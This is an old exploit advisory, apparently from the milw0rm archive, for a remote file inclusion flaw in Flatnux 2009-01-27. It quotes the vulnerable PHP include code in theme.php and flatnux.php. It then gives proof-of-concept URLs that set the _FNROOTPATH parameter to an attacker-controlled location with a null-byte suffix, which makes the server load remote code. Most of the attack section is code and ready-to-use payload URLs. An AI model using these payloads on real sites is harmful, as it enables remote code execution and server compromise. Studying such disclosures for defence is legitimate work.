<html><head><title>Flatnux 2009-01-27 Remote File Inclusion Vulnerability</title></head><pre>@ flatnux Flatnux-2009-01-27 RFI
  zależności P 
  + Alfons Luja 
  + 2009 
  + grts : All friends
  
  
  VULN : 
       +++ include/theme.php
         ... 
        &lt;?php
          if (eregi(&quot;theme.php&quot;, $_SERVER['PHP_SELF']))
	     die();                         // 0 &lt;-- I dont give a fuck 
	

             global $theme, $_FNROOTPATH,$lang;   //&lt;-- 1 
             global $forumback, $forumborder;       
             $_FN['table_background']=&amp;$forumback;
             $_FN['table_border']=&amp;$forumborder;


             if ($forumback==&quot;&quot; &amp;&amp; $forumborder==&quot;&quot;){
	        $forumback=&quot;ffffff&quot;;
	        $forumborder=&quot;000000&quot;;
                }
                require_once ($_FNROOTPATH . &quot;themes/$theme/theme.php&quot;);

             /*------- Funzioni ridefinibili da theme.php--------------*/
         //......
      +++ /flatnux.php line 116:
            
           //$_FNROOTPATH Still dont have value 
           include_once &quot;./include/theme.php&quot;;   //-- 2
          
      +++ /filemanager.php 
          include &quot;./include/flatnux.php&quot;; // -- RFI

  p0c:
     http://localhost/~flatnux/index.php?_FNROOTPATH=[EVIL]%00    
     http://localhost/~flatnux/filemanager.php?mod=&amp;op=&amp;dir=/&amp;opmod=newfile&amp;filemanager_editor=tfuj_stary&amp;_FNROOTPATH=[EVIl]%OO
     ... itd ...

  --http://www.wrzuta.pl/audio/xLyg0zckZS/--
  #EŁOF lol

# milw0rm.com [2009-02-03]</pre></html>